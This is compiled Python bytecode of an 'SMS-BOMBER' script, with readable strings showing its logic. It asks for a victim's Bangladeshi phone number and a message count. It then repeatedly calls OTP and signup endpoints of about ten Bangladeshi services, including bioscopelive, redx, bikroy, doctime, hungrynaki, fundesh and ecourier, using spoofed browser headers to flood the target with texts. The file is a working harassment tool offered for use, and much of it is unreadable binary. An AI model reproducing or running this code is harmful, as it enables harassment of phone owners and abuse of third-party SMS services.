�
    ���e�/  �                   �8  � d dl Z d dlZd dlZd dlZd dlZ ej        d�  �         d� Zd� Z ej        d�  �        Z e	e�  �        Ze�
                    dd�  �        ZdZ ee�  �          ed	�  �          ed
�  �          ed�  �          ed�  �        Ze�
                    dd�  �        Zedk    sedk    r ej        d�  �          e�   �          dS edk    sedk    r! ej        d�  �          e j        �   �          dS  ed�  �          e j        �   �          dS )�    N�clearc                 �   � | D ]S}t           j        �                    |�  �         t           j        �                    �   �          t	          j        d�  �         �Td S )Ng�������?)�sys�stdout�write�flush�time�sleep)�l�is     �/sdcard/smsbomber.py�slwr   	   sT   � �� � �a��J���Q�����J�������J�s�O�O�O�O�� �    c                  �0  � t          j        d�  �         d} | D ]S}t          j        �                    |�  �         t          j        �                    �   �          t          j        d�  �         �Tt          d�  �        }t          t          d�  �        �  �        }dddd	d
dddddddd�}d|� d�}ddd�}||dd�}d}dddddd
ddddddd�}	d |z   }
d!d"dd#d
ddd$d%ddd&dd'�}d(|z   }d)dd�}d*d+d,|z   d+d-�}d.dd�}d/|z   dd0dd1�}d.dd�}d/|z   dd0dd1�}dd2d3d4ddd5ddd6d
ddd7�}d8d9|z   d:d;d<d=d>d?d@�dAdB�}dCdDd&dEdFdG�}dHdddIdJdKd
dddddddL�}dMd9i}dNd9|z   i}ddd2dOdPddd5dd
dddQ�}dR|z   }dS}||k    �r[t          j        ||�T�  �        }|j        dUk    r|dVz  }t          dW|� dX��  �         n	 t          j        |||�Y�  �        }|j        dUk    r|dVz  }t          dW|� dX��  �         n	 t          j        |
|	�T�  �        }|j        dUk    r|dVz  }t          dW|� dX��  �         n	 t          j        ||�T�  �        }|j        dUk    r|dVz  }t          dW|� dX��  �         n	 t          j        dZ||�Y�  �        } | j        dUk    r|dVz  }t          dW|� dX��  �         n	 t          j        d[||�Y�  �        }!|!j        dUk    r|dVz  }t          dW|� dX��  �         n	 t          j        d[||�Y�  �        }"|"j        dUk    r|dVz  }t          dW|� dX��  �         n	 t          j        d\||�]�  �        }#|#j        dUk    r|dVz  }t          dW|� dX��  �         n	 t          j        d^||||�_�  �        }$|$j        dUk    r|dVz  }t          dW|� dX��  �         n	 t          j        ||�T�  �        }%|%j        dUk    r|dVz  }t          dW|� dX��  �         ||k    ��[t          j        d�  �         t          d`�  �         t          j        da�  �         t          j        �   �          d S )bNr   a�  [1;94mMR 
[1;92m    ____ ____  _____ _____ _   _     __  ______  
  / ___|  _ \| ____| ____| \ | |    \ \/ /  _ \ 
 | |  _| |_) |  _| |  _| |  \| |_____\  /| | | |
 | |_| |  _ <| |___| |___| |\  |_____/  \| |_| |
  \____|_| \_\_____|_____|_| \_|    /_/\_\____/ 

   [1;92m{[1;97mDEVOLPER : TAMIM AHMED[1;92m}[1;97m-[1;92m{[1;97mTOOLS : SMS-BOMBER[1;92m}
[1;92m[[1;97m+[1;92m][1;92m----------------------------------------------g����MbP?z2

[1;37m[[38;5;46m+[1;37m] VICTIMS NUMBER : 880z-
[1;37m[[38;5;46m+[1;37m] MESSAGE LIMIT : zwww.bioscopelive.comz*/*zen-GB,en-US;q=0.9,en;q=0.8z%https://www.bioscopelive.com/en/loginz("Chromium";v="107", "Not=A?Brand";v="24"z?1z	"Android"�empty�corszsame-originzxMozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36�XMLHttpRequest)�	authority�accept�accept-language�referer�	sec-ch-ua�sec-ch-ua-mobile�sec-ch-ua-platform�sec-fetch-dest�sec-fetch-mode�sec-fetch-site�
user-agentzx-requested-withz8https://www.bioscopelive.com/en/login/send-otp?phone=880z&operator=bd-otpzhttps://redx.com.bd/)r   r   �redx)�name�phoneNumber�servicez&https://api.redx.com.bd/v1/user/signupz
bikroy.comz!application/json, text/plain, */*�bn�webz!https://bikroy.com/bn/users/login)r   r   r   zapplication-namer   r   r   r   r   r   r   r   zLhttps://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0zwww.ieatery.com.bdz�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9z https://www.ieatery.com.bd/login�document�navigate�1)r   r   r   r   r   r   r   r   r   r   zsec-fetch-userzupgrade-insecure-requestsr   z+https://www.ieatery.com.bd/otp-verify?phn=0zhttps://doctime.com.bd/zehttps://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png�88�0)�flag�code�
contact_no�country_calling_codezhttps://osudpotro.com/z+88-0�en)�mobile�deviceToken�language�osz
keep-alivezhttps://hungrynaki.comzhttps://hungrynaki.com/z	same-sitezapplication/json)�Accept-Language�
Connection�Origin�Referer�Sec-Fetch-Dest�Sec-Fetch-Mode�Sec-Fetch-Site�
User-Agentr   �content-typer   r   r   �	createOtp� �880z$6fdb595b-a310-4f82-acca-a9b9c43e4eb0zLinux aarch64�Chrome�107z,U2FsdGVkX19u2nkZ5KMkGtpye/A3kpZfWKv3ylKExbM=)�phone�country�uuid�osVersionCode�deviceBrand�deviceModel�requestFroma�  mutation createOtp($phone: PhoneNumber!, $country: String!, $uuid: String!, $osVersionCode: String, $deviceBrand: String, $deviceModel: String, $requestFrom: String) {
  createOtp(auth: {phone: $phone, countryCode: $country, deviceUuid: $uuid, deviceToken: ""}, device: {deviceType: WEB, osVersionCode: $osVersionCode, deviceBrand: $deviceBrand, deviceModel: $deviceModel}, requestFrom: $requestFrom) {
    statusCode
  }
}
)�operationName�	variables�queryzGA1.3.1671188319.1677642641zGA1.3.407134519.1677642641zfb.2.1677642641903.2005162471z%GS1.1.1677642640.1.1.1677642660.0.0.0)�_ga�_gidz_gat_UA-146796176-2�_fbp�_ga_5LF4359FD3zfundesh.com.bdzapplication/json; charset=UTF-8zhttps://fundesh.com.bdz&https://fundesh.com.bd/fundesh/profile)r   r   r   r;   �originr   r   r   r   r   r   r   r   �service_key�msisdnzhttps://ecourier.com.bdzhttps://ecourier.com.bd/)�Acceptr3   r4   r5   r6   r7   r8   r9   r:   r   r   r   zGhttps://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=0r   )�headers��   �   z[1;37m
[[38;5;46mz([1;37m][38;5;46m SMS SENT SUCCESSFULLY)rS   �dataz-https://admin.doctime.com.bd/api/authenticatez/https://api.osudpotro.com/api/v1/users/send_otpz'https://api-v4-1.hungrynaki.com/graphql)rS   �jsonz+https://fundesh.com.bd/api/auth/generateOTP)�params�cookiesrS   rW   a�  [1;94mMR 
[1;92m    ____ ____  _____ _____ _   _     __  ______  
  / ___|  _ \| ____| ____| \ | |    \ \/ /  _ \ 
 | |  _| |_) |  _| |  _| |  \| |_____\  /| | | |
 | |_| |  _ <| |___| |___| |\  |_____/  \| |_| |
  \____|_| \_\_____|_____|_| \_|    /_/\_\____/ 

   [1;92m{[1;97mDEVOLPER : TAMIM AHMED[1;92m}[1;97m-[1;92m{[1;97mTOOLS : SMS-BOMBER[1;92m}
[1;92m[[1;97m+[1;92m][1;97m----------------------------------------------z(xdg-open https://t.me/Mueidmursalinrifat)r2   �systemr   r   r   r   r	   r
   �input�int�requests�get�status_code�print�post�exit)&�logor   �num�limitrS   �url1�headers2�data1�url2�headers3�url3�headers4�url4�headers5�data2�headers6�data3�headers7�data4�headers8�data8�cookies9�headers9�params9�
json_data9�	headers10�url10�ses�sent1�sent2�sent3�sent4�sent5�sent6�sent7�sent8�sent9�sent10s&                                         r   �primiamr�      s�  � ��)�G����]�$� � � �a��J���Q�����J�������J�u������K�L�L�#��E�K�L�L�M�M�%� *��5�8�=��'���%� O�*�� �'� X�#�W�W�W�$� (� N�� �(� ���� �%� 0�$�  �3���4�=��'���%� O�� �(� 	W�WZ�Z�$� (� Z�5�3�=��'�"�"�%��#&� O�� �(�  5�S�8�$� +� O�� �(�
 v����G�"�	� �%� *� O�� �(� ������	� �%� *� O�� �(� ������	� �%� 6� �(�*���#� O��(�=��'�� �(�" #��S�&��8�*�!��G�� � �� �%� +�*� �-�?�� �(� $�3�5�7�(�9�=��'���%� O�� �(�" �R��'�
 ��3���*� �5� �)�+���#� O�=��'�� �)� 	R�RU�U�%��#��c�	�	�
�,�t�W�
-�
-�
-�E���#���	�1�f�c��\��\�\�\�]�]�]�]�
�
�-��h�E�
:�
:�
:�E���#���	�1�f�c��\��\�\�\�]�]�]�]�
�
�,�t�H�
-�
-�
-�E���#���	�1�f�c��\��\�\�\�]�]�]�]�
�
�,�t�H�
-�
-�
-�E���#���	�1�f�c��\��\�\�\�]�]�]�]�
�
�-�G�QY�`e�
f�
f�
f�E���#���	�1�f�c��\��\�\�\�]�]�]�]�
�
�-�I�S[�bg�
h�
h�
h�E���#���	�1�f�c��\��\�\�\�]�]�]�]�
�
�-�I�S[�bg�
h�
h�
h�E���#���	�1�f�c��\��\�\�\�]�]�]�]�
�
�-�A�8�Z_�
`�
`�
`�E���#���	�1�f�c��\��\�\�\�]�]�]�]�
�
�-�5������ � �E� ��#���	�1�f�c��\��\�\�\�]�]�]�]�
��\�%�	�2�2�2�F���3���	�1�f�c��\��\�\�\�]�]�]�A 	�c�	�	�B �)�G����� 	]� ^� ^� ^� �)�6�7�7�7��(�*�*�*�*�*r   zfiglet -f slant Tounikr)   r=   a�  [1;94mMR 
[1;92m    ____ ____  _____ _____ _   _     __  ______  
  / ___|  _ \| ____| ____| \ | |    \ \/ /  _ \ 
 | |  _| |_) |  _| |  _| |  \| |_____\  /| | | |
 | |_| |  _ <| |___| |___| |\  |_____/  \| |_| |
  \____|_| \_\_____|_____|_| \_|    /_/\_\____/ 

   [1;92m{[1;97mDEVOLPER : TAMIM AHMED[1;92m}[1;97m-[1;92m{[1;97mTOOLS : SMS-BOMBER[1;92m}
[1;37m[[38;5;46m+[1;37m][38;5;46m----------------------------------------------z9[1;37m[[38;5;46m01[1;37m][38;5;46m START SMS BOMBING z>[1;37m[[38;5;46m02[1;37m][38;5;46m CONTACT ME ON FACEBOOK zS[1;37m[[38;5;46m+[1;37m][38;5;46m----------------------------------------------z;[1;37m[[38;5;46m+[1;37m][38;5;46m YOUR CHOICE [1;37m: � r'   �01z.xdg-open https://www.facebook.com/mr.green.ora�2�02z8[1;37m
[[1;31m![1;37m][1;31m WRONG OPTION ENTERED..
)r   r	   r2   r]   �smtplibrZ   r   r�   �baner�str�replacerc   r`   r[   �usrrb   � r   r   �<module>r�      s�  �� 
�
�
�
� ���� 	�	�	�	� ���� ���� 	��	�'� � � �� � �M� M� M�\ �r�y�)�*�*����E�
�
�����c�"����c�� ��d���� ��M� N� N� N� ��R� S� S� S� ��g� h� h� h�	�E�
V�W�W���K�K��B������9�9��d�
�
��"�)�<�=�=�=�	�'�)�)�)�)�)��3�Y�Y�#��*�*��"�)�<�=�=�=�
�#�(�*�*�*�*�*��%�P�Q�Q�Q�
�#�(�*�*�*�*�*r   